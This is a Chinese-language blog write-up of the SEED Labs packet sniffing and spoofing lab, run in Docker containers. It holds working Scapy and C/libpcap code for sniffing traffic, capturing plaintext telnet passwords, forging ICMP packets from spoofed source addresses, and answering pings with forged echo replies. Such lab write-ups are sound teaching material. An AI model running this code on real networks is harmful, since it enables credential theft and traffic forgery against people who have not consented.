---
title: SeedLab ex2 Packet Sniffing and Spoofing Lab
date: 2023-12-06
categories:
 - 网络安全
cover: /images/covers/mm.png
---
麦!
<!-- more -->
## Task 0 env
docker 搞一搞

## Task 1 Using Scapy to Sniff and Spoof Packets

### Task 1.1 Sniffing Packets

- task 1.1A Capture only the ICMP packet
- 
在attacker容器下执行程序，监听包会经过的网卡，捕获icmp包并答应出包信息。
在host A容器下ping host B，
```ping 10.9.0.6```

观察attacker容器的程序输出和host A的反馈
```python
#!/usr/bin/env python3

from scapy.all import *

def print_pkt(pkt):
    pkt.show()

pkt = sniff(iface='br-9539db83f0ea',filter = 'icmp', prn = print_pkt) # iface 网卡名字
```

- task 1.1B Capture any TCP packet that comes from a particular IP and with a destination port number 23.

修改filter中的内容为tcp and ip src host 10.9.0.5 and dst port 23，从而过滤出不同的包。

```telnet 10.9.0.6```

```python
#!/usr/bin/env python3

from scapy.all import *

def print_pkt(pkt):
    pkt.show()

pkt_tcp_23 = sniff(iface='br-9539db83f0ea',filter = 'tcp and ip src host 10.9.0.5 and dst port 23', prn = print_pkt) # 接受来自10.9.0.5端口23的tcp包
```

- task 1.1C Capture packets comes from or to go to a particular subnet. You can pick any subnet, such as 128.230.0.0/16; 

修改filter中的内容为net 128.230.0.0/16 and ip，从而过滤出不同的包。

```ping 128.230.0.2```

```python
#!/usr/bin/env python3

from scapy.all import *

def print_pkt(pkt):
    pkt.show()

pkt_ip = sniff(iface='br-9539db83f0ea',filter = 'net 128.230.0.0/16 and ip', prn = print_pkt)
```


### Task 1.2 Spoofing ICMP Packets

在一直源地址和目的地址的情况下伪造一个ICMP包并发送。伪造是的128.230.0.2ip返回给host A的包。

attacker 执行代码
hostA tcpdump

```python
#!/usr/bin/env python3

from scapy.all import *

fake = IP()
fake.src = '128.230.0.2'
fake.dst = '10.9.0.5'

icmp = ICMP()

send(fake / icmp)
```


### Task 1.3 Traceroute

这个任务的目标是，得到本机访问一个ip地址需要的跳数。程序思路为：用一个循环其中变量为ttl，范围为1-最大的跳数。循环体中使用ttl限制ICMP发包，如过收到了回应则打印出来，如果返回结果为目标ip则退出循环，得到需要的跳数。

```python
#!/usr/bin/env python3

from scapy.all import *

def traceroute(dst, max_hops = 30):
    for ttl in range (1, max_hops + 1):
        # craete pkt
        pkt = IP(dst = dst, ttl = ttl) / ICMP()

        # send pkt
        reply = sr1(pkt, verbose = 0, timeout = 1) # sr1() 发送数据包并等待 verbose输出详细程度
        if reply is None:
            print(f'{ttl}:')
        else:
            print(f'{ttl}:{reply.src}')

            if reply.src == dst:
                break

traceroute('ip')
```


### Task 1.4 Sniffing and-then Spoofing

嗅探并伪造数据包就是将前两个实验结合，显示捕捉到ICMP，再获取ICMP包中的信息，根据信息伪造包并且发送。限制条件为icmp包且来自于hostA。在attacker容器下执行这个程序。

```python
#!/usr/bin/env python3

from scapy.all import *

def spoof(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8: # request

        # extract data
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        icmp_id = pkt[ICMP].id
        icmp_seq = pkt[ICMP].seq
        data = pkt[Raw].load

        # build packet
        spoofed_pkt = IP(src = dst_ip, dst = src_ip) / ICMP(type = 0, id = icmp_id, seq = icmp_seq)/ data

        # send paclet
        send(spoofed_pkt, verbose = 0)

pkt_ip = sniff(iface='br-9539db83f0ea',filter = 'icmp and ip src 10.9.0.5', prn = spoof)


```


## Task 2 Writing Programs to Sniff and Spoof Packets

### Task 2.1 Writing Packet Sniffing Program

- 2.1A Understanding How a Sniffer Works
- 


**Q1**
1. pcap_open_live 打开网络接口
2. pcap_compile pcap_setfilter 设置过滤
3. 捕获包
4. 回调函数处理

**Q2**

网络接口访问受限？直接使用socket捕获包

**Q3**

只接受发送给他的包，会捕获不到包。

```gcc -o out_name code_name.c -lpcap```

- 2.1B: Writing Filters

编写ICMP包嗅探程序，程序思路：从网络中获取数据包，逐步拆包获得需要的数据，定义ethheader，ipheader，从ipheader中可以识别出包的类型从而判断包。

```c
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>

/* Ethernet header */
struct ethheader {
  u_char ether_dhost[6]; /* destination host address */
  u_char ether_shost[6]; /* source host address */
  u_short ether_type;    /* protocol type (IP, ARP, RARP, etc) */
};

/* IP Header */
struct ipheader {
  unsigned char iph_ihl : 4,       // IP header length
      iph_ver : 4;                 // IP version
  unsigned char iph_tos;           // Type of service
  unsigned short int iph_len;      // IP Packet length (data + header)
  unsigned short int iph_ident;    // Identification
  unsigned short int iph_flag : 3, // Fragmentation flags
      iph_offset : 13;             // Flags offset
  unsigned char iph_ttl;           // Time to Live
  unsigned char iph_protocol;      // Protocol type
  unsigned short int iph_chksum;   // IP datagram checksum
  struct in_addr iph_sourceip;     // Source IP address
  struct in_addr iph_destip;       // Destination IP address
};

void got_packet(u_char *args, const struct pcap_pkthdr *header,
                const u_char *packet) {
  printf("Got a packet\n");
  struct ethheader *eth = (struct ethheader *)packet;

  if (ntohs(eth->ether_type) == 0x0800) {
    struct ipheader *ip =
        (struct ipheader *)(packet + sizeof(struct ethheader));

    printf("SRC:%s\n", inet_ntoa(ip->iph_sourceip));
    printf("DST:%s\n", inet_ntoa(ip->iph_destip));

    switch (ip->iph_protocol) {
    case IPPROTO_TCP:
      printf("Protocol:TCP\n");
      return;
    case IPPROTO_UDP:
      printf("Protocol:UDP\n");
      return;
    case IPPROTO_ICMP:
      printf("Protocol:ICMP\n");
      return;
    default:
      printf("Protocol:others\n");
      return;
    }
  }
}

int main() {
  pcap_t *handle; // 捕捉包的结构体指针
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp; //存储 编译后过滤程序
                         //   char filter_exp[] = "icmp"; // 过滤表达式
                         //   char filter_exp[] = "icmp and (host 10.9.0.5
                         //   and host 10.9.0.6)"; // 过滤表达式
  char filter_exp[] = "tcp and dst portrange 10-100"; // 过滤表达式
  bpf_u_int32 net;                                    // 网络地址

  handle = pcap_open_live("br-9539db83f0ea", BUFSIZ, 1, 1000,
                          errbuf); //打开 br- 返回pcap_t指针
                                   // 1：混杂模式（不论发往那个主机） 1000毫秒

  //编译过滤表达式
  pcap_compile(handle, &fp, filter_exp, 0, net);
  if (pcap_setfilter(handle, &fp) != 0) {
    pcap_perror(handle, "Error:");
    exit(EXIT_FAILURE);
  }

  pcap_loop(handle, -1, got_packet, NULL);

  pcap_close(handle);

  return 0;
}
```

- 2.1C: Sniffing Passwords

在telnet远程控制中，获取传输的密码，假设他是明文传输的。修改程序，添加tcpheader，获取tcp包信息，得到其中的数据部分输出。Filter没特别修改之前的也适用

```C
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>

/* Ethernet header */
struct ethheader {
  u_char ether_dhost[6]; /* destination host address */
  u_char ether_shost[6]; /* source host address */
  u_short ether_type;    /* protocol type (IP, ARP, RARP, etc) */
};

/* IP Header */
struct ipheader {
  //位域 先iph_ver再是iph_ihl
  unsigned char iph_ihl : 4,       // IP header length
      iph_ver : 4;                 // IP version
  unsigned char iph_tos;           // Type of service
  unsigned short int iph_len;      // IP Packet length (data + header)
  unsigned short int iph_ident;    // Identification
  unsigned short int iph_flag : 3, // Fragmentation flags
      iph_offset : 13;             // Flags offset
  unsigned char iph_ttl;           // Time to Live
  unsigned char iph_protocol;      // Protocol type
  unsigned short int iph_chksum;   // IP datagram checksum
  struct in_addr iph_sourceip;     // Source IP address
  struct in_addr iph_destip;       // Destination IP address
};

/* TCP Header */
struct tcpheader {
  u_short th_sport; /* source port */
  u_short th_dport; /* destination port */
  uint32_t th_seq;  /* sequence number */
  uint32_t th_ack;  /* acknowledgement number */
  // u_char th_offset; /* data offset, rsvd */
  u_int8_t th_x2 : 4, /* head len */
      th_off : 4;     /* offset */
  u_char th_flags;    /* control flags */
  u_short th_win;     /* window */
  u_short th_sum;     /* checksum */
  u_short th_urp;     /* urgent pointer */
};

void got_packet(u_char *args, const struct pcap_pkthdr *header,
                const u_char *packet) {
  struct ethheader *eth = (struct ethheader *)packet; //网卡信息
  if (ntohs(eth->ether_type) == 0x0800) {
    struct ipheader *ip = //去除网卡信息
        (struct ipheader *)(packet + sizeof(struct ethheader));
    if (ip->iph_protocol == IPPROTO_TCP) {
      struct tcpheader *tcp = // 去除网卡 IP头
          (struct tcpheader *)(packet + sizeof(struct ethheader) +
                               ip->iph_ihl * 4);
      if (ntohs(tcp->th_dport) == 23) {
        int payload_offset =
            sizeof(struct ethheader) + ip->iph_ihl * 4 + tcp->th_off * 4;
        // 右移4乘4做对齐
        int payload_size =
            ntohs(ip->iph_len) - (ip->iph_ihl * 4 + tcp->th_off * 4);

        if (payload_size > 0) {
          printf("Telnet Data: ");
          for (int i = 0; i < payload_size; i++) {
            printf("%c", packet[payload_offset + i]);
          }
          printf("\n");
        }
      }
    }
  }
}

int main() {
  pcap_t *handle; // 捕捉包的结构体指针
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp; //存储 编译后过滤程序
                         //   char filter_exp[] = "icmp"; // 过滤表达式
                         //   char filter_exp[] = "icmp and (host 10.9.0.5
                         //   and host 10.9.0.6)"; // 过滤表达式
  char filter_exp[] = "tcp and dst portrange 10-100"; // 过滤表达式
  bpf_u_int32 net;                                    // 网络地址

  handle = pcap_open_live("br-9539db83f0ea", BUFSIZ, 1, 1000,
                          errbuf); //打开 br- 返回pcap_t指针
                                   // 1：混杂模式（不论发往那个主机） 1000毫秒

  //编译过滤表达式
  pcap_compile(handle, &fp, filter_exp, 0, net);
  if (pcap_setfilter(handle, &fp) != 0) {
    pcap_perror(handle, "Error:");
    exit(EXIT_FAILURE);
  }

  pcap_loop(handle, -1, got_packet, NULL);

  pcap_close(handle);

  return 0;
}
```

### 2.2 Spoofing

先定义一个buffer，通过ipheader和icmpheader结构体对修改，填写ip头和icmp头的信息。在编写icmp包时添加校验操作。最后发送

```c
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

/* Ethernet header */
struct ethheader {
  u_char ether_dhost[6]; /* destination host address */
  u_char ether_shost[6]; /* source host address */
  u_short ether_type;    /* IP? ARP? RARP? etc */
};

/* IP Header */
struct ipheader {
  unsigned char iph_ihl : 4,       // IP header length
      iph_ver : 4;                 // IP version
  unsigned char iph_tos;           // Type of service
  unsigned short int iph_len;      // IP Packet length (data + header)
  unsigned short int iph_ident;    // Identification
  unsigned short int iph_flag : 3, // Fragmentation flags
      iph_offset : 13;             // Flags offset
  unsigned char iph_ttl;           // Time to Live
  unsigned char iph_protocol;      // Protocol type
  unsigned short int iph_chksum;   // IP datagram checksum
  struct in_addr iph_sourceip;     // Source IP address
  struct in_addr iph_destip;       // Destination IP address
};

/* ICMP Header  */
struct icmpheader {
  unsigned char icmp_type;        // ICMP message type
  unsigned char icmp_code;        // Error code
  unsigned short int icmp_chksum; // Checksum for ICMP Header and data
  unsigned short int icmp_id;     // Used for identifying request
  unsigned short int icmp_seq;    // Sequence number
};

unsigned short in_cksum(unsigned short *buf, int length);
void send_raw_ip_packet(struct ipheader *ip);

int main() {
  char buffer[1500];

  memset(buffer, 0, 1500);

  struct icmpheader *icmp =
      (struct icmpheader *)(buffer + sizeof(struct ipheader));

  icmp->icmp_type = 8;

  icmp->icmp_chksum = 0;
  icmp->icmp_chksum =
      in_cksum((unsigned short *)icmp, sizeof(struct icmpheader));

  struct ipheader *ip = (struct ipheader *)buffer;
  ip->iph_ver = 4;
  ip->iph_ihl = 5;
  ip->iph_ttl = 20;
  ip->iph_sourceip.s_addr = inet_addr("1.2.3.4");
  ip->iph_destip.s_addr = inet_addr("10.9.0.5");
  ip->iph_protocol = IPPROTO_ICMP;
  ip->iph_len = htons(sizeof(struct ipheader) + (sizeof(struct icmpheader)));

  send_raw_ip_packet(ip);
}

unsigned short in_cksum(unsigned short *buf, int length) { //校验
  unsigned short *w = buf;
  int nleft = length;
  int sum = 0;
  unsigned short tmp = 0;

  //每两个字节相加
  while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }

  //剩余一个字节
  if (nleft == -1) {
    *(u_char *)(&tmp) = *(u_char *)w;
    sum += tmp;
  }

  sum = (sum >> 16) + (sum & 0xffff); //高16为加低16为
  sum += (sum >> 16);                 //加进位

  return (unsigned short)(~sum); //返回校验和
}

void send_raw_ip_packet(struct ipheader *ip) {
  struct sockaddr_in dest_info;
  int enable = 1;

  //创建套接字 IPv 类型RAW 协议ICMP
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
  // IP_HDRINCL 自定义头部
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

  // 目标地址信息
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  //发送
  sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info,
         sizeof(dest_info));

  close(sock);
}
```


### 2.3 Sniff and then Spoof

数据不复制

```c
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

/* Ethernet header */
struct ethheader {
  u_char ether_dhost[6]; /* destination host address */
  u_char ether_shost[6]; /* source host address */
  u_short ether_type;    /* IP? ARP? RARP? etc */
};

/* IP Header */
struct ipheader {
  unsigned char iph_ihl : 4,       // IP header length
      iph_ver : 4;                 // IP version
  unsigned char iph_tos;           // Type of service
  unsigned short int iph_len;      // IP Packet length (data + header)
  unsigned short int iph_ident;    // Identification
  unsigned short int iph_flag : 3, // Fragmentation flags
      iph_offset : 13;             // Flags offset
  unsigned char iph_ttl;           // Time to Live
  unsigned char iph_protocol;      // Protocol type
  unsigned short int iph_chksum;   // IP datagram checksum
  struct in_addr iph_sourceip;     // Source IP address
  struct in_addr iph_destip;       // Destination IP address
};

/* ICMP Header  */
struct icmpheader {
  unsigned char icmp_type;        // ICMP message type
  unsigned char icmp_code;        // Error code
  unsigned short int icmp_chksum; // Checksum for ICMP Header and data
  unsigned short int icmp_id;     // Used for identifying request
  unsigned short int icmp_seq;    // Sequence number
};

unsigned short in_cksum(unsigned short *buf, int length) { //校验
  unsigned short *w = buf;
  int nleft = length;
  int sum = 0;
  unsigned short tmp = 0;

  //每两个字节相加
  while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }

  //剩余一个字节
  if (nleft == -1) {
    *(u_char *)(&tmp) = *(u_char *)w;
    sum += tmp;
  }

  sum = (sum >> 16) + (sum & 0xffff); //高16为加低16为
  sum += (sum >> 16);                 //加进位

  return (unsigned short)(~sum); //返回校验和
}

void send_raw_ip_packet(struct ipheader *ip) {
  struct sockaddr_in dest_info;
  int enable = 1;

  //创建套接字 IPv 类型RAW 协议ICMP
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
  // IP_HDRINCL 自定义头部
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

  // 目标地址信息
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  //发送
  sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info,
         sizeof(dest_info));

  close(sock);
}

void spoof_icmp_reply(struct ipheader *ip, struct icmpheader *icmp) {
  char buffer[1500];
  memset(buffer, 0, 1500);
  struct icmpheader *spoof_icmp =
      (struct icmpheader *)(buffer + sizeof(struct ipheader));
  spoof_icmp->icmp_type = 0;
  spoof_icmp->icmp_seq = icmp->icmp_seq;
  spoof_icmp->icmp_id = icmp->icmp_id;
  spoof_icmp->icmp_code = 0;
  spoof_icmp->icmp_chksum = 0;
  spoof_icmp->icmp_chksum =
      in_cksum((unsigned short *)spoof_icmp, sizeof(struct icmpheader));

  struct ipheader *spoof_ip = (struct ipheader *)buffer;
  spoof_ip->iph_ver = 4;
  spoof_ip->iph_ihl = 5;
  spoof_ip->iph_ttl = 64;
  spoof_ip->iph_sourceip = ip->iph_destip;
  spoof_ip->iph_destip = ip->iph_sourceip;
  spoof_ip->iph_protocol = IPPROTO_ICMP;
  spoof_ip->iph_len =
      htons(sizeof(struct ipheader) + sizeof(struct icmpheader));
  send_raw_ip_packet(spoof_ip);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header,
                const u_char *packet) {
  struct ethheader *eth = (struct ethheader *)packet; //网卡信息
  if (ntohs(eth->ether_type) == 0x0800) {
    struct ipheader *ip = //去除网卡信息
        (struct ipheader *)(packet + sizeof(struct ethheader));
    if (ip->iph_protocol == IPPROTO_ICMP) {
      struct icmpheader *icmp =
          (struct icmpheader *)(packet + sizeof(struct ethheader) +
                                sizeof(struct ipheader));
      if (icmp->icmp_type == 8) {
        printf("ICMP Echo Request detected\n");
        spoof_icmp_reply(ip, icmp);
        printf("Spoofed ICMP Echo Reply sent\n");
      }
    }
  }
}

int main() {
  pcap_t *handle; // 捕捉包的结构体指针
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp; //存储 编译后过滤程序
  char filter_exp[] =
      "icmp and (host 10.9.0.5 and host 10.9.0.6)"; // 过滤表达式
  bpf_u_int32 net;                                  // 网络地址

  handle = pcap_open_live("br-9539db83f0ea", BUFSIZ, 1, 1000,
                          errbuf); //打开 br- 返回pcap_t指针
                                   // 1：混杂模式（不论发往那个主机）
                                   // 1000毫秒

  //编译过滤表达式
  pcap_compile(handle, &fp, filter_exp, 1, net);
  if (pcap_setfilter(handle, &fp) != 0) {
    pcap_perror(handle, "Error:");
    exit(EXIT_FAILURE);
  }

  pcap_loop(handle, -1, got_packet, NULL);

  pcap_close(handle);

  return 0;
}
```

**复制数据**

```c
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

/* Ethernet header */
struct ethheader {
  u_char ether_dhost[6]; /* destination host address */
  u_char ether_shost[6]; /* source host address */
  u_short ether_type;    /* IP? ARP? RARP? etc */
};

/* IP Header */
struct ipheader {
  unsigned char iph_ihl : 4,       // IP header length
      iph_ver : 4;                 // IP version
  unsigned char iph_tos;           // Type of service
  unsigned short int iph_len;      // IP Packet length (data + header)
  unsigned short int iph_ident;    // Identification
  unsigned short int iph_flag : 3, // Fragmentation flags
      iph_offset : 13;             // Flags offset
  unsigned char iph_ttl;           // Time to Live
  unsigned char iph_protocol;      // Protocol type
  unsigned short int iph_chksum;   // IP datagram checksum
  struct in_addr iph_sourceip;     // Source IP address
  struct in_addr iph_destip;       // Destination IP address
};

/* ICMP Header  */
struct icmpheader {
  unsigned char icmp_type;        // ICMP message type
  unsigned char icmp_code;        // Error code
  unsigned short int icmp_chksum; // Checksum for ICMP Header and data
  unsigned short int icmp_id;     // Used for identifying request
  unsigned short int icmp_seq;    // Sequence number
};

unsigned short in_cksum(unsigned short *buf, int length) { //校验
  unsigned short *w = buf;
  int nleft = length;
  int sum = 0;
  unsigned short tmp = 0;

  //每两个字节相加
  while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }

  //剩余一个字节
  if (nleft == -1) {
    *(u_char *)(&tmp) = *(u_char *)w;
    sum += tmp;
  }

  sum = (sum >> 16) + (sum & 0xffff); //高16为加低16为
  sum += (sum >> 16);                 //加进位

  return (unsigned short)(~sum); //返回校验和
}

void send_raw_ip_packet(struct ipheader *ip) {
  struct sockaddr_in dest_info;
  int enable = 1;

  //创建套接字 IPv 类型RAW 协议ICMP
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
  // IP_HDRINCL 自定义头部
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

  // 目标地址信息
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  //发送
  sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info,
         sizeof(dest_info));

  close(sock);
}

void spoof_icmp_reply(struct ipheader *ip, struct icmpheader *icmp,
                      const char *data, int data_len) {
  char buffer[1500];
  memset(buffer, 0, 1500);
  struct icmpheader *spoof_icmp =
      (struct icmpheader *)(buffer + sizeof(struct ipheader));
  spoof_icmp->icmp_type = 0;
  spoof_icmp->icmp_seq = icmp->icmp_seq;
  spoof_icmp->icmp_id = icmp->icmp_id;
  spoof_icmp->icmp_code = 0;

  //添加数据
  memcpy((buffer + sizeof(struct ipheader) + sizeof(struct icmpheader)), data,
         data_len);

  spoof_icmp->icmp_chksum = 0;
  spoof_icmp->icmp_chksum = in_cksum((unsigned short *)spoof_icmp,
                                     sizeof(struct icmpheader) + data_len);

  struct ipheader *spoof_ip = (struct ipheader *)buffer;
  spoof_ip->iph_ver = 4;
  spoof_ip->iph_ihl = 5;
  spoof_ip->iph_ttl = 64;
  spoof_ip->iph_sourceip = ip->iph_destip;
  spoof_ip->iph_destip = ip->iph_sourceip;
  spoof_ip->iph_protocol = IPPROTO_ICMP;
  spoof_ip->iph_len =
      htons(sizeof(struct ipheader) + sizeof(struct icmpheader) + data_len);

  send_raw_ip_packet(spoof_ip);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header,
                const u_char *packet) {
  struct ethheader *eth = (struct ethheader *)packet; //网卡信息
  if (ntohs(eth->ether_type) == 0x0800) {
    struct ipheader *ip = //去除网卡信息
        (struct ipheader *)(packet + sizeof(struct ethheader));
    if (ip->iph_protocol == IPPROTO_ICMP) {
      struct icmpheader *icmp =
          (struct icmpheader *)(packet + sizeof(struct ethheader) +
                                sizeof(struct ipheader));
      if (icmp->icmp_type == 8) {
        printf("ICMP Echo Request detected\n");
        // 获取 ICMP 数据
        int data_len = ntohs(ip->iph_len) - sizeof(struct ipheader) -
                       sizeof(struct icmpheader);
        const char *icmp_data =
            (const char *)(packet + sizeof(struct ethheader) +
                           sizeof(struct ipheader) + sizeof(struct icmpheader));

        // 打印 ICMP 数据
        printf("ICMP Data: ");
        for (int i = 0; i < data_len; ++i) {
          printf("%c", icmp_data[i]);
        }
        printf("\n");
        spoof_icmp_reply(ip, icmp, icmp_data, data_len);
        printf("Spoofed ICMP Echo Reply sent\n");
      }
    }
  }
}

int main() {
  pcap_t *handle; // 捕捉包的结构体指针
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp; //存储 编译后过滤程序
  char filter_exp[] =
      "icmp and (host 10.9.0.5 and host 10.9.0.6)"; // 过滤表达式
  bpf_u_int32 net;                                  // 网络地址

  handle = pcap_open_live("br-9539db83f0ea", BUFSIZ, 1, 1000,
                          errbuf); //打开 br- 返回pcap_t指针
                                   // 1：混杂模式（不论发往那个主机）
                                   // 1000毫秒

  //编译过滤表达式
  pcap_compile(handle, &fp, filter_exp, 1, net);
  if (pcap_setfilter(handle, &fp) != 0) {
    pcap_perror(handle, "Error:");
    exit(EXIT_FAILURE);
  }

  pcap_loop(handle, -1, got_packet, NULL);

  pcap_close(handle);

  return 0;
}
```